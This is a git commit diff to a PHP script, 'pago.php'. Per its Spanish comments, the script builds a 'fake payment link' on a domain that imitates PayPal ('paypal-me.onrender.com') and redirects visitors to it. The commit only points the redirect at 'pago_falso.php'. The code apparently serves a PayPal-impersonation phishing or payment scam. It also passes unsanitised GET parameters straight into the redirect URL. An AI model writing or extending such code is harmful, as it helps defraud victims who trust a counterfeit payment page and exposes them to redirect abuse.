cc5d136d11e06fe537632df86a7e269c5586237d
axljosendeah <127257120+axljosendeah@users.noreply.github.com>
2026-09-10 16:36:39 -0400

    pago.php

--- pago.php
+++ pago.php
@@ -6,7 +6,7 @@ $user = $_GET['u'] ?? '';
 $pic = $_GET['pic'] ?? '';
 
 // Generar el enlace de pago falso
-$paylink = "https://paypal-me.onrender.com/pago.php?n=$name&u=$user&pic=$pic";
+$paylink = "https://paypal-me.onrender.com/pago_falso.php?n=$name&u=$user&pic=$pic";
 
 // Redirigir al enlace de pago falso
 header("Location: $paylink");
